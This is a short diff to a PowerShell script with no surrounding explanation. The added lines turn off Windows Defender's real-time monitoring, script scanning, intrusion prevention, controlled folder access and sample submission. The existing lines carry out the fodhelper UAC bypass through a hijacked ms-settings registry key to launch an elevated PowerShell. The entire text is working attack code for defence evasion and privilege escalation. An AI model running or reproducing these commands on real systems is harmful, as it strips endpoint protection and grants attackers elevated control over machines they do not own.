@@ -1,3 +1,5 @@
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+Set-MpPreference -SubmitSamplesConsent 2
 New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe -Force
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 fodhelper
